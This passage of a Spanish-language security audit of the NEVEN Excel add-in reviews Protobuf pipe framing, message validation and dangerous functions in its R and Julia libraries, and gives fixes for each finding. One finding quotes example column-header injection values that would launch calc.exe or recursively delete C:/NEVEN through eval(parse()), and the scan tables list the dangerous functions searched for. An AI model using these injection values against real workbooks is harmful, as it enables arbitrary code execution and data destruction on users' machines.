    return message.ParseFromArray(data + sizeof(int32_t), bytes);
}

// language_service.cc — buffer crece sin límite
if (err == ERROR_MORE_DATA) {
    message_buffer.append(buffer_.data(), bytes);
    if (buffer_.size() < 1024 * 256) buffer_.resize(buffer_.size() * 2);
    // ...
}
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** No existe un tamaño máximo de mensaje configurable en ningún punto del pipeline de comunicación IPC. El protocolo de framing usa un `int32_t` como prefijo de longitud, lo que teóricamente permite mensajes de hasta 2 GB. Aunque el buffer de lectura en `language_service.cc` tiene un tope de crecimiento de 256 KB (`buffer_.size() < 1024 * 256`), el `message_buffer` (std::string) que acumula mensajes parciales **no tiene límite** y puede crecer indefinidamente. En los procesos hijos (ControlR, ControlJulia), la clase `Pipe` acumula datos en `message_buffer_` sin límite de tamaño.
  
  Un proceso hijo comprometido (o un bug que genere mensajes enormes, como un DataFrame de millones de filas) podría enviar un mensaje con prefijo de longitud de 1 GB, causando que el XLL intente asignar 1 GB de memoria para acumular el mensaje, resultando en agotamiento de memoria y crash de Excel.
- **Impacto:** Agotamiento de memoria (DoS), crash de Excel. El buffer de 256 KB limita el buffer de lectura individual pero no el `message_buffer` acumulado.
- **Recomendación:**
  1. Definir una constante `kMaxMessageSize` (ej: 64 MB o 128 MB) en `Constants.h`.
  2. Validar en `Unframe` que `bytes <= kMaxMessageSize` antes de parsear.
  3. Validar en los loops de acumulación (`message_buffer.append(...)`) que el tamaño acumulado no exceda `kMaxMessageSize`.
  4. Retornar error descriptivo cuando se exceda el límite:
```cpp
// En Constants.h
inline constexpr uint32_t kMaxMessageSize = 64 * 1024 * 1024; // 64 MB

// En message_utilities.cc
if (bytes < 0 || static_cast<uint32_t>(bytes) > kMaxMessageSize) return false;

// En language_service.cc (loop de acumulación)
message_buffer.append(buffer_.data(), bytes);
if (message_buffer.size() > rj2xcl::Constants::kMaxMessageSize) {
    response.set_err("message too large");
    break;
}
```

---

### [SEC-ALT-010] Validación post-parseo insuficiente — no se verifican campos obligatorios ni tipos esperados

- **Archivo:** ControlR/src/controlr.cc:225-290, ControlJulia/src/control_julia.cc:232-280, Core/src/language_service.cc:614-625
- **Línea:** Múltiples (ver puntos de switch)
- **Contexto:**
```cpp
// ControlR — InputStreamRead (controlr.cc:225-290)
bool success = MessageUtilities::Unframe(call, message);
if (success) {
    response.set_id(call.id());
    switch (call.operation_case()) {
    case RJ2XCLBuffers::CallResponse::kFunctionCall:
        // Accede directamente a call.function_call().function() sin validar
        switch (call.function_call().target()) { ... }
        break;
    case RJ2XCLBuffers::CallResponse::kCode:
        RExec(response, call);  // No valida que code tenga líneas
        break;
    case RJ2XCLBuffers::CallResponse::kShellCommand:
        len = min(len - 2, (int)call.shell_command().length());
        strcpy_s((char*)buf, len + 1, call.shell_command().c_str());
        break;
    default:
        0;  // Silenciosamente ignora tipos desconocidos
    }
}
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** Después de que `Unframe` parsea exitosamente un mensaje Protobuf, los procesos receptores (ControlR, ControlJulia, ControlPython y el XLL) acceden a los campos del mensaje sin validar su presencia o contenido:
  1. **`operation_case()` no validado exhaustivamente**: El `default` case en los switches es un no-op (`0;`), lo que significa que un mensaje con un `operation_case` inesperado se ignora silenciosamente sin logging ni respuesta de error.
  2. **Campos de `function_call` accedidos sin validar**: `call.function_call().function()` se accede directamente. Si el mensaje tiene `operation_case = kFunctionCall` pero el campo `function` está vacío, se pasa un string vacío a `SystemCall` que no lo maneja correctamente.
  3. **`arguments()` accedidos por índice sin verificar tamaño**: En `SystemCall`, se accede a `call.function_call().arguments(0).str()` sin verificar que `arguments_size() > 0`. Protobuf no crasheará (retorna default), pero la lógica puede comportarse incorrectamente.
  4. **`id` no validado**: El campo `id` (transaction ID) se copia directamente a la respuesta sin verificar que sea un ID válido (no-cero, dentro de rango esperado).
  5. **No se valida coherencia entre campos**: Un mensaje podría tener `wait = true` con `operation_case = kConsole` (que normalmente no espera respuesta), causando un deadlock en el pipe.
- **Impacto:** Comportamiento indefinido con mensajes malformados pero sintácticamente válidos. Potencial deadlock si `wait` es inconsistente con el tipo de operación. Acceso a campos vacíos que podría causar lógica incorrecta.
- **Recomendación:**
  1. Agregar validación de campos obligatorios después del parseo:
```cpp
if (success) {
    // Validar que el mensaje tiene un operation_case válido
    if (call.operation_case() == RJ2XCLBuffers::CallResponse::OPERATION_NOT_SET) {
        CHILD_LOG_ERR("received message with no operation set");
        continue; // o enviar error response
    }
    // Validar campos según el tipo de operación
    if (call.operation_case() == RJ2XCLBuffers::CallResponse::kFunctionCall) {
        if (call.function_call().function().empty()) {
            CHILD_LOG_ERR("received function_call with empty function name");
            response.set_err("invalid function call: empty function name");
            break;
        }
    }
}
```
  2. Validar `arguments_size()` antes de acceder por índice.
  3. Registrar (log) mensajes con `operation_case` inesperado en lugar de ignorarlos silenciosamente.
  4. Considerar una función `ValidateCallResponse()` centralizada que verifique coherencia de campos.

---

### [SEC-MED-003] Sobrescritura del string Unframe sin validación de longitud mínima del buffer

- **Archivo:** Common/message_utilities.cc
- **Línea:** 61-63
- **Contexto:**
```cpp
bool Unframe(google::protobuf::Message &message, const std::string &message_buffer) {
    return Unframe(message, message_buffer.c_str(), (uint32_t)message_buffer.length());
}
```
- **Severidad:** Media
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** La sobrecarga de `Unframe` que acepta `std::string` delega directamente a la versión con `char*` y `uint32_t len`. Si `message_buffer` está vacío (length = 0), se llamará a la versión interna con `len = 0`, que procederá a hacer `memcpy` de 4 bytes desde un buffer de 0 bytes (lectura fuera de límites). Aunque `std::string::c_str()` siempre retorna un puntero válido (al menos al null terminator), leer 4 bytes desde un string vacío es comportamiento indefinido.
  
  Este caso puede ocurrir en la práctica cuando `message_buffer` se construye por acumulación de datos parciales (ERROR_MORE_DATA) y se llama a `Unframe` antes de que se hayan acumulado suficientes bytes. En `language_service.cc:601`:
```cpp
if (message_buffer.length()) {
    message_buffer.append(buffer_.data(), bytes);
    MessageUtilities::Unframe(response, message_buffer);
}
```
  La verificación `message_buffer.length()` protege contra el caso vacío aquí, pero en `RunCallbackThread()` (línea 254) la misma verificación existe. Sin embargo, en ControlR y ControlJulia, la clase `Pipe` maneja la acumulación internamente y podría pasar un buffer parcial.
- **Impacto:** Lectura fuera de límites si se pasa un buffer de menos de 4 bytes. Bajo riesgo en la práctica porque los callers verifican longitud, pero la función no es defensiva por sí misma.
- **Recomendación:** Agregar la validación de longitud mínima en la función interna (como se recomienda en SEC-ALT-008), lo que protege ambas sobrecargas automáticamente.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-PB-001] Protocolo de framing con length-prefix implementado consistentemente

- **Archivo:** Common/message_utilities.cc:55-67
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** El proyecto implementa un protocolo de framing consistente basado en length-prefix (4 bytes int32_t + payload Protobuf) a través de las funciones `Frame()` y `Unframe()` en `MessageUtilities`. Este patrón es correcto para multiplexar mensajes sobre Named Pipes en modo `PIPE_READMODE_MESSAGE` y es usado uniformemente en todos los procesos (XLL, ControlR, ControlJulia, ControlPython). La centralización en un único par de funciones facilita la corrección de vulnerabilidades en un solo punto.

### [FOR-PB-002] Manejo de mensajes parciales (ERROR_MORE_DATA) implementado

- **Archivo:** Core/src/language_service.cc:628-633, ControlR/src/controlr.cc (Pipe class)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** El código maneja correctamente el caso de mensajes que exceden el buffer de lectura del pipe (ERROR_MORE_DATA de Windows). Cuando un mensaje es más grande que el buffer, se acumula en un `message_buffer` a través de múltiples lecturas antes de intentar el parseo. El buffer de lectura crece dinámicamente (hasta 256 KB) para reducir la fragmentación. Este patrón es necesario para soportar DataFrames grandes y es implementado correctamente en términos de lógica de acumulación.

### [FOR-PB-003] Verificación del resultado de ParseFromArray/Unframe

- **Archivo:** ControlR/src/controlr.cc:225, ControlJulia/src/control_julia.cc:232, Core/src/language_service.cc:601-608
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** Todos los puntos de deserialización verifican el valor de retorno de `MessageUtilities::Unframe()` (que retorna el resultado de `ParseFromArray`). Si el parseo falla, se registra un error y no se procesa el mensaje. En `language_service.cc`, un fallo de parseo genera `response.set_err("parse error (0x10)")`. En ControlR y ControlJulia, se registra "error parsing packet" en el log. Esto previene el procesamiento de mensajes corruptos o truncados.

### [FOR-PB-004] Named Pipes en modo PIPE_READMODE_MESSAGE proveen integridad de transporte

- **Archivo:** Core/src/language_service.cc:310, Common/pipe.cc:218
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Validación de mensajes Protobuf
- **Descripción:** Los Named Pipes se configuran en modo `PIPE_READMODE_MESSAGE` (no byte stream), lo que significa que Windows garantiza la entrega de mensajes completos a nivel de transporte. Cada `ReadFile` retorna exactamente un mensaje completo (o ERROR_MORE_DATA si el buffer es insuficiente). Esto proporciona una capa de integridad a nivel de OS que reduce (pero no elimina) el riesgo de mensajes parciales o intercalados. Combinado con el framing de length-prefix, el protocolo es robusto para comunicación local entre procesos confiables.

---

## Tabla Resumen de Hallazgos

| ID | Título | Severidad | Archivo principal |
|----|--------|-----------|-------------------|
| SEC-ALT-008 | Unframe sin validación de longitud del frame | Alta | Common/message_utilities.cc:56-59 |
| SEC-ALT-009 | Ausencia de tamaño máximo de mensaje | Alta | Common/message_utilities.cc, Core/src/language_service.cc |
| SEC-ALT-010 | Validación post-parseo insuficiente | Alta | ControlR/controlr.cc, ControlJulia/control_julia.cc |
| SEC-MED-003 | Sobrescritura string Unframe sin validación mínima | Media | Common/message_utilities.cc:61-63 |

## Recomendaciones Priorizadas

1. **[Prioridad 1 — Impacto Alto, Esfuerzo Bajo]** Corregir `MessageUtilities::Unframe()` para validar `len >= sizeof(int32_t)`, `bytes >= 0`, y `bytes <= len - sizeof(int32_t)`. Es un cambio de 3 líneas en un único archivo que protege los 14+ puntos de llamada.
2. **[Prioridad 2 — Impacto Alto, Esfuerzo Bajo]** Definir `kMaxMessageSize` en `Constants.h` y validar en `Unframe` que `bytes <= kMaxMessageSize`.
3. **[Prioridad 3 — Impacto Alto, Esfuerzo Medio]** Agregar validación de `message_buffer.size()` en los loops de acumulación de mensajes parciales (language_service.cc, RunCallbackThread, Pipe class).
4. **[Prioridad 4 — Impacto Medio, Esfuerzo Medio]** Implementar función `ValidateCallResponse()` centralizada que verifique campos obligatorios según `operation_case()`.
5. **[Prioridad 5 — Impacto Bajo, Esfuerzo Bajo]** Agregar logging para mensajes con `operation_case` inesperado o `OPERATION_NOT_SET` en lugar de ignorarlos silenciosamente.

---

## Nota sobre el Modelo de Amenaza

Las comunicaciones por Named Pipe en NEVEN son **locales** (entre procesos en la misma máquina) y los pipes se crean con nombres que incluyen el PID del proceso (`RJ2XCL2-PIPE-R-{pid}`). Esto limita significativamente la superficie de ataque:

- **Escenario principal de riesgo**: Un proceso hijo comprometido (ControlR/ControlJulia) que envía mensajes malformados al XLL para crashear Excel o leer memoria.
- **Escenario secundario**: Un proceso malicioso local que conoce el nombre del pipe y se conecta antes que el proceso hijo legítimo (pipe squatting). Los pipes no tienen ACLs restrictivas (se crean con `NULL` security attributes).
- **Mitigación existente**: Windows `PIPE_READMODE_MESSAGE` garantiza integridad de transporte, y los procesos hijos son lanzados por el XLL mismo (no son servicios expuestos).

Las correcciones recomendadas son de bajo esfuerzo y alta defensa en profundidad, protegiendo contra bugs internos además de ataques deliberados.


---

# Hallazgos de Seguridad — Funciones Peligrosas en Scripts R

**Tarea:** 3.1 Analizar archivos R en libreria/R/ y startup/ en busca de funciones peligrosas  
**Fecha:** 2026-01-XX  
**Alcance:** libreria/R/ (33 archivos .R), startup/startup.r  
**Patrones buscados:** system(), system2(), shell(), eval(), parse() con entrada no sanitizada; acceso a filesystem fuera del directorio de trabajo

---

## Resumen del Escaneo

### Funciones peligrosas de ejecución de comandos OS

| Función | Ocurrencias en libreria/R/ | Ocurrencias en startup/startup.r |
|---------|---------------------------|----------------------------------|
| `system()` | 0 | 0 |
| `system2()` | 0 | 0 |
| `shell()` | 0 | 0 |
| `shell.exec()` | 0 | 0 |
| `proc.time()` | 0 | 0 |

### Funciones de evaluación dinámica

| Función | Ocurrencias en libreria/R/ | Ocurrencias en startup/startup.r |
|---------|---------------------------|----------------------------------|
| `eval(parse(text=...))` | 11 (en 10 archivos) | 0 |
| `deparse(substitute(...))` | 0 | 1 (seguro — introspección) |
| `source()` | 1 (ruta hardcodeada legacy) | 0 |

### Operaciones de filesystem

| Operación | Ocurrencias | Contexto |
|-----------|-------------|----------|
| `writeLines()` a directorio NEVEN | 4 archivos | Escritura HTML a `NEVEN_HOME/webview2-data/` |
| `dir.create()` | 7 archivos | Creación de directorios de output |
| `saveRDS()` | 1 archivo | Guardado de modelos a directorio elegido por usuario |
| `readLines()` con ruta de usuario | 1 archivo | TextMining lee archivo de ruta proporcionada |
| `saveWidget()` | 4 archivos | Guardado de widgets HTML |

### Conclusión General

Los scripts R de la librería R4XCL **no contienen llamadas a funciones de ejecución de comandos del sistema operativo** (`system()`, `system2()`, `shell()`). Sin embargo, se identificó un patrón recurrente de `eval(parse(text=...))` en 10 archivos que, aunque su uso actual es para construcción de fórmulas estadísticas (patrón idiomático en R), recibe datos derivados de nombres de columnas de Excel que podrían ser manipulados. La severidad real es **Media** (no Crítica) porque: (1) el string evaluado se construye internamente a partir de nombres de columnas, no de contenido arbitrario de celdas, (2) el patrón `Y ~ X1 + X2` limita la superficie de inyección, y (3) no hay ejecución de comandos OS involucrada.

---

## Hallazgos

---

### [SEC-MED-002] eval(parse(text=...)) con nombres de columnas derivados de celdas Excel — riesgo de inyección de código R

- **Archivos afectados:**
  - `libreria/R/R4XCL-RG-Lineal.R` (línea 44)
  - `libreria/R/R4XCL-RG-Binaria.R` (línea 39)
  - `libreria/R/R4XCL-RG-Poisson.R` (línea 24)
  - `libreria/R/R4XCL-RG-Tobit.R` (línea 35)
  - `libreria/R/R4XCL-RG-DatosPanel.R` (líneas 36, 96)
  - `libreria/R/R4XCL-RG-ArbolDecision.R` (línea 58)
  - `libreria/R/R4XCL-RG-SVM.R` (línea 43)
  - `libreria/R/R4XCL-GR-Graficacion.R` (línea 49)
  - `libreria/R/R4XCL-UT-Pivote.R` (línea 162)
- **Severidad:** Media
- **Categoría:** Seguridad > Evaluación dinámica de código
- **Descripción:** Diez archivos de la librería R4XCL usan el patrón `eval(parse(text=FX))` donde `FX` es una cadena construida por `R4XCL_INT_FUNCION()`. Esta función toma los nombres de columnas de la primera fila de los datos de Excel (`SetDatosX[1,]` y `SetDatosY[1,]`) y construye una fórmula como `"Y ~ X1 + X2 + X3"`. El resultado se pasa a `eval(parse(text=...))` para crear un objeto `formula` de R.

  **Flujo de datos:**
  ```
  Celda Excel (nombre de columna) → LPXLOPER12 → R matrix → SetDatosX[1,] 
    → R4XCL_INT_FUNCION() → paste("Y ~", "X1 + X2") → eval(parse(text=...))
  ```

  **Riesgo:** Si un usuario coloca en la primera fila (encabezados) de sus datos un valor malicioso como `"); system("calc.exe` o `X1); unlink('C:/NEVEN', recursive=TRUE` como nombre de columna, el `eval(parse())` ejecutaría código R arbitrario. Sin embargo, este código corre **dentro del motor R embebido** (ControlR.exe), no directamente en Excel, y el `SandboxVerifier` **no aplica** a estas funciones de librería (solo aplica a código de usuario directo).

  **Factores mitigantes:**
  1. Los nombres de columnas en Excel típicamente son strings cortos alfanuméricos.
  2. La función `R4XCL_INT_FUNCION()` usa `paste()` con separadores fijos (`~`, `+`), lo que limita la estructura del string resultante.
  3. El `SandboxVerifier` bloquea `eval(parse())` en código de usuario directo, pero estas funciones de librería se ejecutan fuera del sandbox.
  4. Un atacante necesitaría que la víctima abra un archivo Excel malicioso con encabezados crafteados y ejecute una función estadística.
  5. Incluso si se inyecta código R, el proceso ControlR.exe no tiene privilegios elevados.

  **Riesgo residual:** Un nombre de columna malicioso podría ejecutar código R arbitrario dentro de ControlR.exe, incluyendo operaciones de filesystem, lectura de archivos sensibles, o exfiltración de datos via conexiones de red (que no están bloqueadas para código de librería).

- **Recomendación:**
  1. **Preferida:** Reemplazar `eval(parse(text=FX))` por `as.formula(FX)` que solo acepta sintaxis de fórmula R válida y no ejecuta código arbitrario:
     ```r
     # Antes (inseguro):
     especificacion <- eval(parse(text=FX))
     # Después (seguro):
     especificacion <- as.formula(FX)
     ```
  2. **Alternativa:** Validar que los nombres de columnas solo contienen caracteres alfanuméricos, puntos y guiones bajos antes de construir la fórmula:
     ```r
     R4XCL_INT_FUNCION <- function(SetDatosX, SetDatosY = NULL) {
       nombresX <- paste0(SetDatosX[1, 1:ncol(SetDatosX)])
       nombresY <- paste0(SetDatosY[1, 1])
       # Validar nombres
       all_names <- c(nombresX, nombresY)
       if (any(!grepl("^[A-Za-z0-9._]+$", all_names))) {
         stop("Error: nombres de variables contienen caracteres no permitidos")
       }
       # ... resto de la función
     }
     ```
  3. Aplicar la misma corrección al caso de `R4XCL-UT-Pivote.R` donde `C=paste0("cbind(",A,")~",B)` se pasa a `eval(parse(text=C))`.

---

### [SEC-MED-003] eval(parse(text=...)) en R4XCL_INT_LISTA_DATASETS con nombre de paquete de usuario

- **Archivo:** `libreria/R/R4XCL-0-Interno-1.R`
- **Línea:** 46
- **Contexto:**
```r
R4XCL_INT_LISTA_DATASETS = function(psPkg) {
  if (!is.character(psPkg)) { stop("Error: psPkg debe ser un nombre de paquete válido.") }
  if (!requireNamespace(psPkg, quietly = TRUE)) { stop("Error: El paquete ", psPkg, " no está instalado.") }
  # ...
  v <- ls(paste0("package:", psPkg))
  for(i in 1:nV) {
    x = eval(parse(text= paste0("class(",psPkg,"::",v[i],")") ))
    # ...
  }
}
```
- **Severidad:** Baja
- **Categoría:** Seguridad > Evaluación dinámica de código
- **Descripción:** La función `R4XCL_INT_LISTA_DATASETS` recibe un nombre de paquete (`psPkg`) y construye expresiones como `class(wooldridge::wage1)` que se evalúan con `eval(parse(text=...))`. Aunque `psPkg` podría provenir de entrada de usuario, la validación previa con `requireNamespace(psPkg)` asegura que solo se aceptan nombres de paquetes R realmente instalados, lo que limita significativamente el vector de ataque. Un nombre de paquete válido en R solo puede contener letras, números y puntos.

  **Factores mitigantes:**
  1. `requireNamespace()` valida que el string es un paquete instalado real.
  2. Los nombres de paquetes R no pueden contener paréntesis, comillas ni operadores.
  3. `v[i]` proviene de `ls()` sobre el namespace del paquete, que retorna nombres de objetos válidos.

- **Recomendación:** Reemplazar por la alternativa segura sin eval:
  ```r
  x = class(getExportedValue(psPkg, v[i]))
  ```
  O usar `get(v[i], envir = asNamespace(psPkg))` que no requiere evaluación dinámica de texto.

---

### [SEC-BAJ-002] readLines() con ruta de archivo proporcionada por usuario sin validación de path traversal

- **Archivo:** `libreria/R/R4XCL-AD-TextMining.R`
- **Línea:** 38
- **Contexto:**
```r
TM_TextMining <- function(RUTA_FL=NULL, RUTA_SW=NULL, ...) {
  # ...
  text = readLines(RUTA_FL)
  # ...
  if (!is.null(RUTA_SW)) {
    StopWords = readLines(RUTA_SW)
  }
}
```
- **Severidad:** Baja
- **Categoría:** Seguridad > Acceso a filesystem
- **Descripción:** La función `TM_TextMining` recibe parámetros `RUTA_FL` y `RUTA_SW` que son rutas de archivo proporcionadas desde Excel. Estas rutas se pasan directamente a `readLines()` sin validación de path traversal ni restricción de directorio. Un usuario podría leer cualquier archivo de texto accesible por el proceso ControlR.exe, incluyendo archivos de configuración del sistema, logs, o archivos de otros usuarios.

  **Factores mitigantes:**
  1. `readLines()` solo lee archivos de texto — no ejecuta código ni modifica el filesystem.
  2. El proceso ControlR.exe corre con los mismos permisos que Excel (el usuario actual), por lo que no hay escalación de privilegios.
  3. El usuario ya tiene acceso directo a estos archivos desde Excel (File > Open).
  4. La función está diseñada para análisis de texto — leer archivos es su propósito legítimo.

- **Recomendación:** Dado que el riesgo es mínimo (el usuario ya tiene acceso a los archivos con sus propios permisos), no se requiere acción inmediata. Opcionalmente, validar que la ruta no contiene `..` para prevenir confusión:
  ```r
  if (grepl("\\.\\.", RUTA_FL)) stop("Error: rutas con '..' no están permitidas")
  ```

---

### [SEC-BAJ-003] source() con ruta hardcodeada legacy no funcional

- **Archivo:** `libreria/R/R4XCL-FX-Aleatorios.R`
- **Línea:** 36-37
- **Contexto:**
```r
DIR_ORIG <- "~/BERT2/functions/INTERNO/"
ARCHIVO  <- paste0(DIR_ORIG,"R4XCL-INTERNO.R")
FUENTE01 <- file.path(ARCHIVO)
source(FUENTE01)
```
- **Severidad:** Baja
- **Categoría:** Seguridad > Carga de código externo
- **Descripción:** La función en `R4XCL-FX-Aleatorios.R` contiene un `source()` que intenta cargar un archivo desde `~/BERT2/functions/INTERNO/R4XCL-INTERNO.R`. Esta es una ruta legacy del sistema anterior (BERT2) que probablemente no existe en instalaciones actuales de NEVEN. Si un atacante creara un archivo en esa ruta en el directorio home del usuario, el código se ejecutaría sin verificación dentro del contexto de la librería (fuera del sandbox).

  **Factores mitigantes:**
  1. La ruta `~/BERT2/` es específica y poco probable que exista en sistemas actuales.
  2. Si el archivo no existe, `source()` genera un error que detiene la función.
  3. Requiere acceso previo al filesystem del usuario para plantar el archivo.
  4. Este código parece ser residual de una versión anterior y probablemente no se ejecuta en producción.

- **Recomendación:**
  1. Eliminar el bloque `source()` legacy ya que las funciones internas se cargan via el sistema de auto-carga de NEVEN.
  2. Si la funcionalidad es necesaria, usar la ruta del sistema NEVEN: `file.path(Sys.getenv("NEVEN_HOME", "C:/NEVEN"), "libreria/R/R4XCL-0-Interno-1.R")`.

---

### [SEC-INF-002] Escritura de archivos HTML a directorio fijo sin sanitización de contenido

- **Archivos afectados:**
  - `libreria/R/R4XCL-AD-D3.R` (línea 277)
  - `libreria/R/R4XCL-AD-Dashboard.R` (línea 310)
  - `libreria/R/R4XCL-AD-Esquisse.R` (línea 168)
  - `libreria/R/R4XCL-AD-Map.R` (línea 157)
  - `libreria/R/R4XCL-GR-QuickPlot.R` (línea 111)
  - `libreria/R/R4XCL-GR-PlotlyView.R` (línea 49)
  - `libreria/R/R4XCL-AD-Pivot.R` (línea 59)
- **Severidad:** Informativa
- **Categoría:** Seguridad > Acceso a filesystem
- **Descripción:** Siete archivos de la librería escriben archivos HTML generados al directorio `NEVEN_HOME/webview2-data/` usando `writeLines()` o `saveWidget()`. Los archivos se nombran con timestamp para evitar colisiones. El contenido HTML se genera internamente a partir de datos del usuario (celdas Excel) y se renderiza en WebView2. Aunque los datos de usuario se incorporan al HTML (potencial XSS en el visor), esto es por diseño — el WebView2 renderiza contenido generado por el propio usuario.

  **Factores mitigantes:**
  1. La escritura se limita al directorio `NEVEN_HOME/webview2-data/` (no es arbitraria).
  2. Los archivos son temporales de visualización, no ejecutables.
  3. El directorio se resuelve via `Sys.getenv("NEVEN_HOME")` con fallback a `C:/NEVEN`.
  4. `dir.create(dir, recursive = TRUE)` crea el directorio si no existe.

- **Recomendación:** No se requiere acción. El patrón es seguro para su propósito (generar visualizaciones HTML temporales). Considerar limpiar archivos antiguos periódicamente para evitar acumulación.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-SCR-001] Ausencia total de funciones de ejecución de comandos OS en librería R

- **Archivo:** Todos los archivos en libreria/R/ (33 archivos) y startup/startup.r
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts R
- **Descripción:** La librería R4XCL **no contiene ninguna llamada** a `system()`, `system2()`, `shell()`, `shell.exec()` ni ninguna otra función de ejecución de comandos del sistema operativo. Esto elimina completamente el riesgo de inyección de comandos OS desde los scripts R de la librería, incluso considerando que estas funciones corren fuera del sandbox del `SandboxVerifier`.

### [FOR-SCR-002] startup.r minimalista sin funciones peligrosas

- **Archivo:** startup/startup.r
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts R
- **Descripción:** El script de inicio R (`startup.r`) es minimalista y seguro: define funciones de utilidad para gráficos (`BERT.graphics.device`), introspección (`NEVEN$list.functions`), y extracción de outputs de modelos (`Extraer_outputs`). No contiene `eval()`, `parse()`, `system()`, ni acceso a filesystem fuera de `%USERPROFILE%\Documents\NEVEN\graphics\` (para almacenar plots temporales). El único uso de `deparse(substitute())` es para introspección de nombres de objetos, que es completamente seguro.

### [FOR-SCR-003] Escritura de archivos confinada a directorio NEVEN controlado

- **Archivo:** libreria/R/R4XCL-GR-QuickPlot.R, R4XCL-GR-PlotlyView.R, R4XCL-AD-Pivot.R, R4XCL-AD-Map.R, R4XCL-AD-Esquisse.R, R4XCL-AD-Dashboard.R, R4XCL-AD-D3.R
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Acceso a filesystem
- **Descripción:** Todas las operaciones de escritura de archivos en la librería R se confinan al directorio `NEVEN_HOME/webview2-data/` usando la función helper `.neven_webview_dir()`. Esta función resuelve la ruta via variable de entorno con fallback seguro, y los nombres de archivo incluyen timestamp para evitar colisiones. No hay escritura a directorios arbitrarios controlados por el usuario.

### [FOR-SCR-004] SandboxVerifier bloquea eval(parse()) en código de usuario

- **Archivo:** Common/SandboxVerifier.cc:99
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts R
- **Descripción:** Aunque las funciones de librería usan `eval(parse(text=...))` internamente, el `SandboxVerifier` bloquea explícitamente este patrón en código de usuario directo (scripts escritos en celdas Excel via `=NEVEN.r()`). Esto previene que un usuario malicioso use `eval(parse())` directamente, limitando el vector de ataque solo a la manipulación indirecta via nombres de columnas en datos.

### [FOR-SCR-005] Validación de entrada en R4XCL_INT_LISTA_DATASETS

- **Archivo:** libreria/R/R4XCL-0-Interno-1.R:15-22
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts R
- **Descripción:** La función `R4XCL_INT_LISTA_DATASETS` valida que `psPkg` es un string (`is.character`) y que es un paquete instalado (`requireNamespace`) antes de usarlo en `eval(parse())`. Esto limita efectivamente el vector de inyección ya que solo nombres de paquetes R válidos (alfanuméricos + punto) pasan la validación.

---

## Resumen de Riesgo

| ID | Severidad | Descripción | Acción requerida |
|----|-----------|-------------|------------------|
| SEC-MED-002 | Media | eval(parse()) con nombres de columnas de Excel | Reemplazar por `as.formula()` |
| SEC-MED-003 | Baja | eval(parse()) con nombre de paquete validado | Reemplazar por `getExportedValue()` |
| SEC-BAJ-002 | Baja | readLines() sin validación de path | Opcional — riesgo mínimo |
| SEC-BAJ-003 | Baja | source() con ruta legacy no funcional | Eliminar código residual |
| SEC-INF-002 | Informativa | Escritura HTML a directorio controlado | No requiere acción |

**Hallazgo principal:** No se encontraron funciones que ejecuten comandos del sistema operativo con input de usuario. El riesgo más significativo es el uso de `eval(parse(text=...))` que podría permitir ejecución de código R arbitrario (no comandos OS) si un atacante manipula los nombres de columnas en un archivo Excel malicioso. La corrección es simple: reemplazar `eval(parse(text=FX))` por `as.formula(FX)` en los 10 archivos afectados.

---

## Nota sobre el Modelo de Amenaza

Las funciones de la librería R4XCL se ejecutan **fuera del sandbox** del `SandboxVerifier` porque son código de confianza del desarrollador, no código de usuario. El `SandboxVerifier` solo analiza el código que el usuario escribe directamente en celdas Excel (via `=NEVEN.r("código aquí")`). 

Sin embargo, las funciones de librería **reciben parámetros** que provienen de celdas Excel (rangos de datos, rutas de archivo, nombres de columnas). El vector de ataque es indirecto: un atacante no puede ejecutar `system()` directamente (bloqueado por sandbox), pero podría craftar un archivo Excel con nombres de columnas maliciosos que, al ser procesados por funciones de librería como `RG_Lineal()`, se inyectan en `eval(parse())`.

La severidad se clasifica como **Media** (no Crítica) porque:
1. No hay ejecución de comandos OS — solo código R dentro de ControlR.exe
2. Requiere ingeniería social (víctima debe abrir archivo Excel malicioso y ejecutar función)
3. ControlR.exe no tiene privilegios elevados
4. La corrección (`as.formula()`) es trivial y elimina el riesgo completamente


---

# Hallazgos de Seguridad — Funciones Peligrosas en Scripts Julia

**Tarea:** 3.2 Analizar archivos Julia en libreria/JULIA/ y startup/ en busca de uso inseguro  
**Fecha:** 2026-01-XX  
**Alcance:** libreria/JULIA/ (5 archivos), startup/startup.jl  
**Archivos analizados:**
- `libreria/JULIA/functions.jl` (648 líneas)
- `libreria/JULIA/J4XCL-CN-Conectividad.jl` (~280 líneas)
- `libreria/JULIA/J4XCL-ML-Aprendizaje.jl` (~380 líneas)
- `libreria/JULIA/J4XCL-MT-Matematicas.jl` (~400 líneas)
- `libreria/JULIA/J4XCL-OP-Optimizacion.jl` (~280 líneas)
- `startup/startup.jl` (~240 líneas)

---

## Resumen del Escaneo

### Funciones peligrosas buscadas

| Función peligrosa | Ocurrencias en código propio | Con entrada dinámica |
|-------------------|------------------------------|----------------------|
| `run()` / `` `cmd` `` | 0 | 0 |
| `eval()` | 0 | 0 |
| `Meta.parse()` | 0 | 0 |
| `include()` / `Base.include()` | 1 (startup.jl:17) | Sí — path de C++ |
| `ccall()` | 2 (startup.jl:103,162) | No — punteros internos |
| `open()` (escritura) | 1 (startup.jl:198) | Parcial — nombre de dataset |
| `readdlm()` / `writedlm()` | 4 (J4XCL-CN) | Sí — ruta de Excel |
| `readdir()` | 1 (J4XCL-CN:121) | Sí — ruta de Excel |
| `stat()` | 1 (J4XCL-CN:106) | Sí — ruta de Excel |
| `mkpath()` | 1 (startup.jl:196) | No — directorio fijo |
| `download()` / `HTTP` | 0 | 0 |
| `@ccall` / `unsafe_*` | 0 | 0 |

### Contexto de Seguridad

